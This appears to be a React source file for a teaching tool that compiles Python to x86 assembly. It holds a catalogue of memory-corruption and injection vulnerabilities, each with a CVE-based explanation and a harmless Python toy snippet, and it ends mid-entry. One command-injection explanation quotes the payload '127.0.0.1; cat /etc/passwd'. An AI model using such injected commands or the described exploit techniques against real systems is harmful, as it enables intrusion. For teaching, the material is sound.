import CodeMirror from '@uiw/react-codemirror'
import { python } from '@codemirror/lang-python'
import { oneDark } from '@codemirror/theme-one-dark'
import type { EditorView } from '@codemirror/view'
import { useState, useRef } from 'react'
import { compile, CompileMethod, CompileResponse, GlossaryEntry, LineMapping } from '../api'
import CodePane from '../components/CodePane'
import AsmPane, { AsmLineInfo } from '../components/AsmPane'

// ─── Cost-analysis flag presentation ───────────────────────────────────────
// Backend flags an asm-expensive Python line with one of these keys. The
// marker is the compact glyph shown in the TRACE legend; the label is the
// human-readable name used in tooltips.
const FLAG_MARKER: Record<string, string> = { div: '÷', mul: '×', call: '⤳' }
const FLAG_LABEL: Record<string, string> = {
  div: 'integer division (idiv)',
  mul: 'multiply (imul)',
  call: 'function call',
}

// ─── Instruction-mix presentation ──────────────────────────────────────────
// Backend sorts every mapped x86 instruction into one of these categories so a
// learner can read the *shape* of a line, not just its instruction count. The
// order here is the order they are shown in tooltips and the MIX summary chip.
const CATEGORY_ORDER = ['mem', 'compute', 'branch', 'call', 'stack', 'other'] as const
const CATEGORY_LABEL: Record<string, string> = {
  mem: 'memory',
  compute: 'compute',
  branch: 'branch',
  call: 'call',
  stack: 'stack',
  other: 'other',
}

// Render a category-count map as a compact "mem 6 · compute 1" string in the
// stable CATEGORY_ORDER, skipping categories the backend already omitted.
function formatMix(counts?: Record<string, number>): string {
  if (!counts) return ''
  return CATEGORY_ORDER
    .filter(cat => (counts[cat] ?? 0) > 0)
    .map(cat => `${CATEGORY_LABEL[cat] ?? cat} ${counts[cat]}`)
    .join(' · ')
}

// ─── Register-footprint presentation ────────────────────────────────────────
// Backend reports the canonical 32-bit x86 registers each Python line's asm
// touches, plus a program-wide count of how many instructions reference each.
// This stable order (accumulator-first, frame/stack pointers last) is how the
// registers are shown in the REGS summary chip and per-line tooltips.
const REGISTER_ORDER = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'ebp', 'esp', 'eip', 'st'] as const

// Render a register-count map as "eax 12 · edx 3" in REGISTER_ORDER, with any
// unrecognised register names (kept as-is by the backend) appended after.
function formatRegisterTotals(totals?: Record<string, number>): string {
  if (!totals) return ''
  const known = REGISTER_ORDER.filter(r => (totals[r] ?? 0) > 0) as string[]
  const extra = Object.keys(totals)
    .filter(r => !(REGISTER_ORDER as readonly string[]).includes(r) && totals[r] > 0)
    .sort()
  return [...known, ...extra].map(r => `%${r} ${totals[r]}`).join(' · ')
}

// ─── Memory-traffic presentation ────────────────────────────────────────────
// Backend splits each line's data movement into memory reads (loads) and writes
// (stores). At -O0 every variable lives on the stack, so a plain `x += 1` is a
// load → compute → store round-trip; the counts make that stack shuffling
// visible. Rendered "N ld · N st" in the MEM chip and per-line tooltips.
function formatMemory(counts?: Record<string, number>): string {
  if (!counts) return ''
  const parts: string[] = []
  if ((counts.loads ?? 0) > 0) parts.push(`${counts.loads} ld`)
  if ((counts.stores ?? 0) > 0) parts.push(`${counts.stores} st`)
  return parts.join(' · ')
}

// ─── Instruction-glossary presentation ─────────────────────────────────────
// The backend returns one entry per distinct mnemonic in the compiled asm.
// Render them, grouped by the same category order as the mix, into a single
// multi-line tooltip so a learner can decode the ASM pane at a glance.
function formatGlossary(entries?: GlossaryEntry[]): string {
  if (!entries || entries.length === 0) return ''
  return entries
    .map(e => `${e.mnemonic}  —  ${e.description}`)
    .join('\n')
}

// ─── Vulnerability catalogue ───────────────────────────────────────────────

interface Vuln {
  id: string
  name: string
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM'
  category: string
  description: string
  explanation: string
  code: string
  badAsm: { patterns: string[]; description: string }
}

const VULNS: Vuln[] = [
  {
    id: 'stack-bof',
    name: 'STACK BUFFER OVERFLOW',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Loop smashes past a fixed stack frame, clobbering the return address.',
    explanation:
      'Classic stack smashing: a fixed-size buffer lives on the stack, but the loop bound comes from ' +
      'attacker-controlled input. Once the write index exceeds the buffer, subsequent iterations overwrite ' +
      'adjacent stack slots — first local variables, then the saved frame pointer, then the return address. ' +
      'The attacker points the return address at shellcode or a ROP gadget. ' +
      'In the assembly, `subq $N, %rsp` allocates a small fixed frame while the loop\'s `cmpl` compares ' +
      'against a much larger bound; the `movl` inside the loop reaches past %rbp once the index exceeds N/4.',
    code:
`# CVE pattern: fixed stack buf[8], loop bound 64 — smashes return addr
def copy_input():
    buf_size = 8
    input_len = 64
    total = 0
    i = 0
    while i < input_len:
        total += i
        if i >= buf_size:
            total += 1
        i += 1
    return total

result = copy_input()
print(result)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'cmpl compares against attacker-controlled bound; movl writes past the allocated stack frame, overwriting saved %rbp then the return address',
    },
  },
  {
    id: 'heap-uaf',
    name: 'HEAP USE-AFTER-FREE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Object fields accessed after the object is freed and its memory reclaimed.',
    explanation:
      'Use-after-free is behind a huge share of browser CVEs (Chrome, Firefox, Safari). ' +
      'The allocator is free to hand the released chunk to a different allocation; ' +
      'if an attacker triggers a heap spray first, they control what bytes now occupy the old slot. ' +
      'The object\'s method dispatch reads a function pointer from the now-attacker-controlled memory, ' +
      'redirecting execution. ' +
      'In the assembly, the struct is zeroed (ptr = 0, size = 0 simulates free), yet the subsequent ' +
      '`movl` still reads from the same stack offset — at runtime that region holds attacker data.',
    code:
`# CVE pattern: object freed (zeroed), dangling field access follows
class Chunk:
    def __init__(self, size):
        self.size = size
        self.data = size * 4
        self.freed = 0

    def read(self):
        result = self.data + self.size
        return result

c = Chunk(64)
c.freed = 1
c.size = 0
c.data = 0
stale = c.read()
print(stale)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl reads from a zeroed (freed) stack slot — at runtime an attacker heap-sprays the freed region so these reads return attacker-controlled bytes',
    },
  },
  {
    id: 'vtable-hijack',
    name: 'VTABLE HIJACK',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Attacker overwrites a function-pointer field to redirect virtual dispatch.',
    explanation:
      'C++ vtable hijacking is a cornerstone exploit technique. Every polymorphic object holds a pointer ' +
      'to its vtable — a table of function pointers for virtual methods. ' +
      'When a use-after-free or heap overflow lets an attacker write to the object\'s memory layout, ' +
      'they overwrite the vtable pointer (or a specific slot) with an address they control. ' +
      'The next virtual call becomes an indirect jump to attacker-chosen code. ' +
      'In the assembly, `movl` writes 0x41414141 (AAAA) into the handler field, then `imull`/`movl` ' +
      'uses that value directly — an attacker replaces it with a gadget or shellcode address.',
    code:
`# CVE pattern: vtable-style handler pointer overwritten by attacker
class VTable:
    def __init__(self, handler):
        self.handler = handler
        self.refcount = 1
        self.flags = 0

    def dispatch(self):
        result = self.handler * 2
        self.flags += 1
        return result

vt = VTable(4196352)
vt.handler = 1094795585
result = vt.dispatch()
print(result)
`,
    badAsm: {
      patterns: ['imull', 'movl'],
      description: 'movl loads the attacker-overwritten handler value; imull multiplies using it as an operand — in a real vtable hijack this becomes an indirect call to attacker-chosen code',
    },
  },
  {
    id: 'double-free',
    name: 'DOUBLE FREE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Same memory block freed twice, corrupting allocator metadata.',
    explanation:
      'Double-free corrupts the heap allocator\'s free-list metadata. ' +
      'Modern allocators (ptmalloc, jemalloc) use inline linked-list pointers in freed chunks. ' +
      'Freeing the same chunk twice lets an attacker — who controls a subsequent allocation — ' +
      'overwrite those pointers, turning the next malloc into an arbitrary-write primitive. ' +
      'Exploited in CVE-2019-11477 (Linux TCP SACK), CVE-2022-0185, and many others. ' +
      'The assembly shows free_count incremented twice from the same base address; ' +
      'a real allocator would detect this via its tcache key check and abort, ' +
      'but older versions silently corrupt the bin.',
    code:
`# CVE pattern: free() called twice on the same block
class MemBlock:
    def __init__(self, size):
        self.size = size
        self.ptr = size * 8
        self.free_count = 0

    def free(self):
        self.ptr = 0
        self.free_count += 1

block = MemBlock(32)
block.free()
block.free()
result = block.free_count
print(result)
`,
    badAsm: {
      patterns: ['addl', 'movl'],
      description: 'addl increments free_count from the same base address twice; in a real heap this corrupts the allocator\'s tcache bin, turning the next malloc into an arbitrary-write primitive',
    },
  },
  {
    id: 'off-by-one',
    name: 'OFF-BY-ONE OVERFLOW',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: '<= instead of < lets the loop write one slot past the buffer end.',
    explanation:
      'Off-by-one overflows are deceptively simple: a single misplaced `<=` makes the loop run one ' +
      'iteration too many, writing exactly one element past the buffer boundary. ' +
      'On the stack this overwrites the low byte of the saved frame pointer (%rbp), ' +
      'which the compiler uses to restore the caller\'s stack frame on return — ' +
      'giving the attacker control of where the caller resumes execution. ' +
      'Exploited in CVE-2021-3156 (sudo heap off-by-one), OpenSSH, and Sendmail. ' +
      'In the assembly, the `cmpl` bound is buf_size (8) but the loop condition uses `<=` so it ' +
      'executes with i=8, writing a 9th element one slot past the 8-element frame.',
    code:
`# CVE pattern: <= instead of < writes one element past the buffer
def copy_buf():
    buf_size = 8
    i = 0
    total = 0
    while i <= buf_size:
        total += i
        if i == buf_size:
            total += 9999
        i += 1
    return total

result = copy_buf()
print(result)
`,
    badAsm: {
      patterns: ['cmpl', 'jle'],
      description: 'cmpl + jle implements the <= bound — with buf_size=8 the loop runs a 9th iteration, writing one slot past the buffer end and overwriting the low byte of saved %rbp',
    },
  },
  {
    id: 'cmd-injection',
    name: 'COMMAND INJECTION',
    severity: 'CRITICAL',
    category: 'Injection',
    description: 'Unsanitized user-controlled value piped into a shell command.',
    explanation:
      'Command injection lets an attacker embed shell metacharacters — ; && | $() — in any field ' +
      'that reaches a shell interpreter. Even a numeric parameter is dangerous if passed through ' +
      'string concatenation: "ping -c 1 " + user_ip becomes "ping -c 1 127.0.0.1; cat /etc/passwd" ' +
      'when the attacker supplies "127.0.0.1; cat /etc/passwd". ' +
      'The assembly shows the user-supplied value loaded via `movl` then added directly into a buffer ' +
      'passed to the output call — no range check or character-filter instructions appear between ' +
      'the load and the `call`. In a real system this buffer feeds system() or execve().',
    code:
`# CVE pattern: user value reaches exec pipeline without validation
class ShellRunner:
    def __init__(self, base_cmd):
        self.base_cmd = base_cmd
        self.user_input = 0
        self.executed = 0

    def set_input(self, val):
        self.user_input = val

    def run(self):
        payload = self.base_cmd + self.user_input
        self.executed += 1
        return payload

runner = ShellRunner(1000)
runner.set_input(1094861636)
result = runner.run()
print(result)
`,
    badAsm: {
      patterns: ['addl', 'call'],
      description: 'addl combines base_cmd with unsanitized user_input; call passes the result to the output function — in a real system this buffer feeds system() or execve() with shell metacharacters intact',
    },
  },
  {
    id: 'type-confusion',
    name: 'TYPE CONFUSION',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Object reinterpreted as a different type; fields map to attacker-controlled offsets.',
    explanation:
      'Type confusion vulnerabilities treat memory allocated as one type as if it were a different type. ' +
      'In C++ this commonly happens via incorrect downcasts, union misuse, or corrupted vtable pointers. ' +
      'The attacker arranges for an object of type A to be cast to type B; field offsets differ, ' +
      'so reading "field 0 of B" actually reads an unrelated value from A\'s layout. ' +
      'Exploited extensively in V8 (Chrome JS engine): JIT-compiled code assumes an object\'s type tag ' +
      'is stable, but a side-channel trick changes the tag between the check and the use. ' +
      'In the assembly, two structs share a stack frame; the second struct\'s field reads overlap ' +
      'the first struct\'s data — the `movl` at offset -8(%rbp) reads what was written as a size, ' +
      'not a handler.',
    code:
`# CVE pattern: two structs share memory; field offsets alias
class TypeA:
    def __init__(self, size, data):
        self.size = size
        self.data = data
        self.checksum = size + data

class TypeB:
    def __init__(self, handler, flags):
        self.handler = handler
        self.flags = flags
        self.refcount = 1

a = TypeA(256, 1094795585)
b = TypeB(a.data, a.size)
confused = b.handler + b.flags
print(confused)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl reads b.handler and b.flags from stack offsets that alias TypeA\'s layout — the "handler" field contains a.data (attacker-controlled), not a function pointer from a safe vtable',
    },
  },
  {
    id: 'rop-gadget',
    name: 'ROP CHAIN SETUP',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Stack smash loads attacker addresses into saved registers for a ROP chain.',
    explanation:
      'Return-Oriented Programming (ROP) is the primary code-execution technique on systems with ' +
      'non-executable stack (NX/DEP). Instead of injecting shellcode, the attacker overwrites the ' +
      'stack with a chain of return addresses — each pointing to a short "gadget" (existing code ' +
      'ending in `ret`) that performs one small operation. Chaining gadgets achieves arbitrary computation. ' +
      'The setup stage: a stack overflow writes attacker-chosen values into saved register slots. ' +
      'In the assembly, `movl` stores 0xdeadbeef and 0x400600 into stack slots that the epilogue\'s ' +
      '`popq` will restore into %rbx and %r12 — those registers become the first two gadget addresses ' +
      'once the function returns.',
    code:
`# ROP setup: overflow writes gadget addresses into callee-saved slots
def build_rop_frame():
    saved_rbx = 3735928559
    saved_r12 = 4195840
    saved_r13 = 4196096
    chain_len = 0
    i = 0
    while i < 8:
        if i == 0:
            chain_len = saved_rbx
        elif i == 1:
            chain_len += saved_r12
        elif i == 2:
            chain_len += saved_r13
        i += 1
    return chain_len

payload = build_rop_frame()
print(payload)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl plants gadget addresses (0xdeadbeef, 0x400600) into stack slots; the epilogue\'s pop instructions restore these into callee-saved registers which become the first ROP gadget addresses on return',
    },
  },
  {
    id: 'toctou-race',
    name: 'TOCTOU RACE CONDITION',
    severity: 'CRITICAL',
    category: 'Race Condition',
    description: 'Resource state changes between security check and use, bypassing access control.',
    explanation:
      'Time-of-Check Time-of-Use (TOCTOU / CWE-367) is a race condition where the program checks a ' +
      'condition (e.g. file permissions, ownership, credential validity) and then acts on the result, ' +
      'but an attacker modifies the resource in the window between the check and the use. ' +
      'The classic UNIX exploit: a setuid program calls access() to verify a user may read a file, ' +
      'then calls open() — the attacker uses a symlink swap between the two calls to redirect ' +
      'the open to /etc/shadow. Exploited in CVE-2024-7348 (PostgreSQL pg_dump — attacker replaces ' +
      'a relation with a view during the race window to execute arbitrary SQL as a superuser), ' +
      'CVE-2024-50379 (Apache Tomcat — TOCTOU during JSP compilation enables RCE on case-insensitive ' +
      'file systems), and a Docker TOCTOU (CVE-2019-19921) that granted root access to the host filesystem. ' +
      'At Pwn2Own 2023 a TOCTOU bug was used to compromise a Tesla Model 3. ' +
      'In the assembly, the `cmpl` from the check and the `movl` from the use reference the same ' +
      'stack offset, but no lock or atomic operation guards the gap — a concurrent write between ' +
      'the two instructions changes the value the use reads.',
    code:
`# CVE pattern: check-then-use gap lets attacker swap resource
class Resource:
    def __init__(self, owner, perms):
        self.owner = owner
        self.perms = perms
        self.data = 0
        self.modified = 0

    def set_data(self, val):
        self.data = val
        self.modified = 1

class AccessChecker:
    def __init__(self, required_perms):
        self.required_perms = required_perms
        self.check_passed = 0
        self.used = 0

    def check(self, res):
        if res.perms >= self.required_perms:
            self.check_passed = 1
        return self.check_passed

    def use(self, res):
        result = res.data * self.check_passed
        self.used = 1
        return result

res = Resource(1000, 755)
checker = AccessChecker(644)
checker.check(res)
res.data = 3735928559
res.owner = 0
privileged_read = checker.use(res)
print(privileged_read)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'cmpl checks resource.perms but no atomic guard prevents swapping res.data in the race window; movl then reads the now-attacker-controlled value in the use phase — classic check-then-use exploit',
    },
  },
  {
    id: 'integer-overflow',
    name: 'INTEGER OVERFLOW',
    severity: 'CRITICAL',
    category: 'Arithmetic',
    description: 'Signed 32-bit counter wraps negative, bypassing a size-guard and enabling heap underflow.',
    explanation:
      'Integer overflow is deceptively simple: adding 1 to a signed 32-bit maximum (0x7fffffff) ' +
      'wraps around to −2147483648. If the wrapped value is then used as an allocation size or ' +
      'array index, the allocator may receive a tiny (or zero) size while the caller writes a much ' +
      'larger number of bytes — a heap underflow. ' +
      'CVE-2021-3156 (sudo) and CVE-2022-0847 (Dirty Pipe) both involve arithmetic that silently ' +
      'wraps before a bounds check, making the check meaningless. ' +
      'In the assembly, the `addl` instruction sets the OF (overflow) flag when wrapping, but ' +
      'no `jo` branch follows — the wrapped value flows directly into the `cmpl` guard, which ' +
      'passes because −1 < 0 is trivially true in signed comparison.',
    code:
`# CVE pattern: signed 32-bit counter wraps past INT_MAX, bypasses guard
def alloc_buffer():
    INT_MAX = 2147483647
    count = INT_MAX
    extra = 1
    total = count + extra
    guard = 0
    if total > 0:
        guard = total
    else:
        guard = 1
    result = guard * 4
    return result

size = alloc_buffer()
print(size)
`,
    badAsm: {
      patterns: ['addl', 'cmpl'],
      description: 'addl sets the Overflow Flag when INT_MAX+1 wraps to -2147483648; cmpl then compares the wrapped negative value — the guard passes because no `jo` branch follows, letting a tiny allocation proceed with a massive write',
    },
  },
  {
    id: 'format-string',
    name: 'FORMAT STRING',
    severity: 'CRITICAL',
    category: 'Injection',
    description: 'User-controlled format string reads arbitrary stack slots via %x/%n specifiers.',
    explanation:
      'Format string vulnerabilities arise when user input is passed directly as the format ' +
      'argument to printf-family functions. The attacker supplies specifiers like %x to read ' +
      'successive stack words, leaking stack canaries, return addresses, and heap pointers — ' +
      'enough to defeat ASLR. Adding %n writes the character count to an attacker-chosen address, ' +
      'turning a read-primitive into an arbitrary write. ' +
      'Classic targets: wu-ftpd (CVE-2000-0573), glibc syslog, and many embedded firmware stacks. ' +
      'In the assembly, the format buffer is loaded via `leaq` and passed as the first argument ' +
      '(%rdi) without any interposing sanitization — the `call` to the output function receives ' +
      'raw user bytes as its format string, and %rsi/%rdx/%rcx are whatever happened to live in ' +
      'those registers, not validated arguments.',
    code:
`# CVE pattern: user string used as format — leaks stack values
class Logger:
    def __init__(self, base):
        self.base = base
        self.leak1 = 0
        self.leak2 = 0
        self.written = 0

    def log(self, user_fmt):
        self.leak1 = self.base + user_fmt
        self.leak2 = self.leak1 * 2
        self.written += 1
        return self.leak2

logger = Logger(134513152)
result = logger.log(1094861636)
print(result)
`,
    badAsm: {
      patterns: ['leaq', 'call', 'addl', 'imull'],
      description: 'leaq loads user_fmt directly into %rdi as the format argument; call passes it to the output function with no sanitization — %rsi/%rdx hold whatever was in those registers, making %x specifiers leak stack data',
    },
  },
  {
    id: 'uninit-memory',
    name: 'UNINITIALIZED MEMORY READ',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'Buffer allocated without zeroing leaks stale stack data from prior call frames.',
    explanation:
      'Uninitialized memory reads (CWE-908) occur when a buffer or struct is allocated without being ' +
      'zeroed, leaving residual data from prior stack frames or heap allocations readable by an attacker. ' +
      'A partial fill writes only some fields; the rest retain stale values such as stack canaries, ' +
      'KASLR base pointers, or cryptographic keys from a previous call frame. ' +
      'CVE-2024-50302 (Linux kernel HID core) is a critical real-world example: the HID report buffer ' +
      'was allocated without memset, allowing a crafted USB HID device to leak raw kernel memory. ' +
      'This vulnerability was actively exploited by Cellebrite in a zero-day exploit chain targeting ' +
      'Android devices and was added to CISA\'s Known Exploited Vulnerabilities catalog in March 2025. ' +
      'USENIX WOOT \'20 research demonstrated that even low-CVSS uninitialized stack variable bugs can ' +
      'be weaponized via deterministic stack spraying to defeat KASLR and leak stack canaries. ' +
      'In the assembly, `movl` stores sentinel values (0xCAFEBABE, 0xFFFF0000) into struct fields ' +
      'during construction; fill_partial zeroes only data0, but `addl` in read_report sums all three ' +
      'slots — the uncleared fields still hold stale data, defeating KASLR and leaking canaries.',
    code:
`# CVE pattern: buffer allocated without zeroing — stale data readable
class ReportBuffer:
    def __init__(self, size):
        self.size = size
        self.data0 = 3405691582
        self.data1 = 4294901760
        self.data2 = 4196096
        self.initialized = 0

    def fill_partial(self, count):
        if count >= 1:
            self.data0 = 0
        self.initialized = count
        return self.initialized

    def read_report(self):
        total = self.data0 + self.data1 + self.data2
        return total

buf = ReportBuffer(256)
buf.fill_partial(1)
leaked = buf.read_report()
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl loads stale sentinel values (0xCAFEBABE, 0xFFFF0000) into unzeroed struct fields on the stack; addl in read_report sums all fields including the two never cleared — the leaked total contains kernel pointers and canary fragments',
    },
  },
  {
    id: 'signedness-confusion',
    name: 'SIGNEDNESS CONFUSION',
    severity: 'CRITICAL',
    category: 'Arithmetic',
    description: 'Negative signed integer passes a less-than bounds check, then wraps to a huge unsigned offset for OOB access.',
    explanation:
      'Signedness confusion (CWE-195 / CWE-196) occurs when a signed integer is compared using a signed ' +
      'relational operator but later used in an unsigned context such as a buffer index or allocation size. ' +
      'A negative value like -1 trivially passes `if (index < max_entries)` because -1 < 32 is true in signed ' +
      'arithmetic, but when cast to size_t or used as an unsigned offset, -1 becomes 0xFFFFFFFF (4 GB) — a ' +
      'massive out-of-bounds write. CVE-2024-56614 (Linux kernel AF_XDP xsk_map) allowed kernel OOB writes ' +
      'because the check `if (k >= max_entries)` did not block negative signed values of k, letting a ' +
      'user-controlled index reach kernel memory far outside the map array. CVE-2024-47606 (GStreamer) ' +
      'turned a signed integer underflow in Theora extension parsing into remote code execution — the ' +
      '`gint size` variable went negative, passed a positive-only guard, then was used as a length for ' +
      'a memcpy that corrupted the heap. CVE-2007-1997 (ClamAV) exploited a signed comparison in CHM ' +
      'archive parsing to trigger a stack-based buffer overflow. ' +
      'In the assembly, `cmpl` performs a signed comparison (using `jge`/`jl` rather than unsigned ' +
      '`jae`/`jb`), so the negative index passes the guard; the subsequent `imull` multiplies the ' +
      'negative value to compute the offset, producing a large wrapped result that `addl` feeds ' +
      'directly into the buffer write — an OOB primitive.',
    code:
`# CVE pattern: signed index passes < check, wraps for OOB write
class ArrayMap:
    def __init__(self, capacity):
        self.capacity = capacity
        self.slot0 = 0
        self.slot1 = 0
        self.write_count = 0

    def delete_entry(self, index):
        if index < self.capacity:
            offset = index * 8
            self.slot0 += offset
            self.write_count += 1
        return self.write_count

    def read_total(self):
        result = self.slot0 + self.slot1
        return result

amap = ArrayMap(32)
amap.delete_entry(4)
neg_index = 0 - 1
amap.delete_entry(neg_index)
result = amap.read_total()
print(result)
`,
    badAsm: {
      patterns: ['cmpl', 'imull'],
      description: 'cmpl uses signed comparison (jl/jge) so -1 passes the < capacity check; imull then multiplies the negative index by 8, producing a wrapped offset that addl applies as an out-of-bounds write far outside the buffer',
    },
  },
  {
    id: 'heap-spray',
    name: 'HEAP SPRAY',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Attacker fills the heap with NOP-sled + shellcode blocks so any corrupted pointer dereference lands in controlled memory.',
    explanation:
      'Heap spraying (CWE-122 adjacent) is a reliability technique that fills the process heap with hundreds of ' +
      'identical blocks — each containing a NOP sled (0x90 bytes) followed by shellcode — so that any corrupted ' +
      'pointer dereference statistically lands in attacker-controlled memory. The technique transforms unreliable ' +
      'use-after-free or buffer overflow bugs into near-deterministic code execution. ' +
      'CVE-2022-0609 (Chrome Animation UAF, exploited in the wild by Lazarus Group) used heap spraying after ' +
      'corrupting animation object pointers to achieve reliable RCE. CVE-2025-4096 (Chrome HTML parser heap ' +
      'overflow) was noted as chainable with heap spraying for controlled code execution. The technique dates ' +
      'to 2001 but became widespread in 2005 via Internet Explorer ActiveX exploits; modern variants target ' +
      'V8 and SpiderMonkey JIT heaps. ' +
      'In the assembly, the spray loop\'s `addl` accumulates total_bytes from each SprayBlock — the NOP sled ' +
      'value (0x90909090) and shellcode marker (0xDEADBEEF) are loaded by `movl` into stack slots; ' +
      '`deref_corrupted` adds an offset directly to last_payload with no bounds check, simulating an ' +
      'arbitrary pointer dereference into sprayed memory.',
    code:
`# CVE pattern: heap filled with NOP sleds — corrupted ptr lands in payload
class SprayBlock:
    def __init__(self, sled, payload):
        self.sled = sled
        self.payload = payload
        self.size = sled + payload

class Heap:
    def __init__(self, capacity):
        self.capacity = capacity
        self.fill_count = 0
        self.total_bytes = 0
        self.last_payload = 0

    def spray(self, sled, payload, count):
        i = 0
        while i < count:
            block = SprayBlock(sled, payload)
            self.total_bytes += block.size
            self.last_payload = block.payload
            self.fill_count += 1
            i += 1
        return self.fill_count

    def deref_corrupted(self, offset):
        result = self.last_payload + offset
        return result

heap = Heap(1048576)
nop_sled = 2425393296
shellcode = 3735928559
heap.spray(nop_sled, shellcode, 8)
hijacked = heap.deref_corrupted(256)
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl loads NOP sled (0x90909090) and shellcode (0xDEADBEEF) into stack slots for each SprayBlock; addl accumulates total_bytes in the spray loop — deref_corrupted adds an offset to last_payload with no bounds check, landing execution in attacker-sprayed memory',
    },
  },
  {
    id: 'null-deref',
    name: 'NULL POINTER DEREFERENCE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Dereferencing an unchecked NULL pointer crashes the process or lets an attacker map code at address zero for kernel-mode execution.',
    explanation:
      'NULL pointer dereference (CWE-476) occurs when a program follows a pointer it expects to be valid ' +
      'but which is NULL, typically crashing with SIGSEGV. On older kernels without mmap_min_addr or SMAP, ' +
      'an attacker can mmap page zero and place shellcode there — when the kernel dereferences a NULL function ' +
      'pointer, execution jumps to the attacker\'s code running in ring 0. ' +
      'CVE-2009-2692 (Linux kernel sendpage) exploited uninitialized proto_ops function pointers: the kernel ' +
      'called a NULL sendpage handler after the attacker mapped executable code at address 0x0, achieving ' +
      'local privilege escalation to root. CVE-2019-9213 bypassed mmap_min_addr protections by exploiting a ' +
      'missing check in expand_downwards, re-enabling NULL-page mapping on non-SMAP platforms. ' +
      'CVE-2025-49694 (Windows Server 2025) demonstrated a kernel NULL dereference granting local privilege ' +
      'escalation without user interaction. CWE-476 ranks in the 2024 CWE Top 25 most dangerous weaknesses. ' +
      'In the assembly, `movl $0` zeroes the handler field but no conditional branch guards the subsequent ' +
      '`addl` that reads from the same offset — the CPU dereferences the NULL-derived address, landing in ' +
      'attacker-controlled memory at the zero page.',
    code:
`# CVE pattern: NULL function ptr called — attacker maps code at 0x0
class Object:
    def __init__(self, handler, data):
        self.handler = handler
        self.data = data
        self.refcount = 1

    def invoke(self):
        result = self.handler + self.data
        self.refcount -= 1
        return result

class Allocator:
    def __init__(self, capacity):
        self.capacity = capacity
        self.count = 0
        self.last_result = 0

    def create(self, handler, data):
        obj = Object(handler, data)
        self.count += 1
        return obj

    def release(self, obj):
        obj.handler = 0
        obj.data = 0
        self.count -= 1
        return self.count

alloc = Allocator(64)
obj = alloc.create(4196352, 256)
alloc.release(obj)
dangling = obj.invoke()
print(dangling)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl zeroes the handler field (simulating NULL assignment); the subsequent invoke\'s addl reads from the same stack offset without a NULL guard — on a real system the CPU dereferences address 0x0 where the attacker has mapped shellcode via mmap',
    },
  },
  {
    id: 'write-what-where',
    name: 'WRITE-WHAT-WHERE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Attacker gains ability to write an arbitrary value to an arbitrary memory address, enabling full control hijack.',
    explanation:
      'A write-what-where condition (CWE-123) gives the attacker a primitive to write any value (the "what") to any ' +
      'memory address (the "where"). This is the most powerful corruption primitive: with a single controlled write, ' +
      'an attacker can overwrite function pointers, GOT entries, return addresses, or security-critical flags. ' +
      'The primitive typically arises from corrupted heap metadata (unlinking a freed chunk patches arbitrary pointers), ' +
      'out-of-bounds array indexing with an attacker-controlled index and value, or format string %n writes. ' +
      'CVE-2024-21338 (Windows AppLocker kernel driver) was exploited by the Lazarus Group: the appid.sys IOCTL ' +
      'allowed tricking the kernel into calling an arbitrary pointer, which Lazarus used to establish a kernel ' +
      'read/write primitive and deploy the FudModule rootkit with SYSTEM privileges. CVE-2024-1086 (Linux netfilter ' +
      'nf_tables) provided an arbitrary write via a use-after-free in verdict handling, enabling local privilege ' +
      'escalation to root — actively exploited in ransomware campaigns by RansomHub and Akira in 2025. ' +
      'In the assembly, `imull` computes the byte offset from the attacker-controlled index, and `movl` writes the ' +
      'attacker-chosen value at that computed offset — no bounds check guards the store, giving a full write-what-where primitive.',
    code:
`# CVE pattern: controlled index + value = write-what-where primitive
class HeapMeta:
    def __init__(self, capacity):
        self.capacity = capacity
        self.slot0 = 0
        self.slot1 = 0
        self.slot2 = 0
        self.guard = 1337

    def write_entry(self, index, value):
        offset = index * 8
        if index == 0:
            self.slot0 = value
        elif index == 1:
            self.slot1 = value
        elif index == 2:
            self.slot2 = value
        else:
            self.guard = value
        return offset

    def read_guard(self):
        result = self.guard + self.slot0
        return result

meta = HeapMeta(32)
meta.write_entry(0, 100)
meta.write_entry(1, 200)
attacker_index = 99
attacker_value = 3735928559
meta.write_entry(attacker_index, attacker_value)
leaked = meta.read_guard()
print(leaked)
`,
    badAsm: {
      patterns: ['imull', 'movl'],
      description: 'imull computes the byte offset from the attacker-controlled index (99) without bounds checking; movl writes the attacker-chosen value (0xDEADBEEF) at that offset — overwriting the guard slot simulates corrupting heap metadata or a GOT entry for full control hijack',
    },
  },
  {
    id: 'ret2libc',
    name: 'RET2LIBC',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Buffer overflow overwrites the return address with libc\'s system() to spawn a shell, bypassing non-executable stack (NX/DEP).',
    explanation:
      'Return-to-libc (ret2libc) is the foundational code-reuse attack: instead of injecting shellcode onto a ' +
      'non-executable stack, the attacker overwrites the saved return address with the address of libc\'s system() ' +
      'function and places a pointer to "/bin/sh" in the argument slot — when the function epilogue executes `ret`, ' +
      'control transfers directly to system("/bin/sh"), spawning a root shell. First demonstrated by Alexander ' +
      'Peslyak in 1997, ret2libc remains the basis for modern ROP chains and SROP attacks. ' +
      'CVE-2023-6246 (glibc __vsyslog_internal heap overflow) enabled local privilege escalation to root on ' +
      'Debian, Ubuntu, and Fedora by exploiting a buffer overflow in syslog() — the attacker leveraged libc\'s ' +
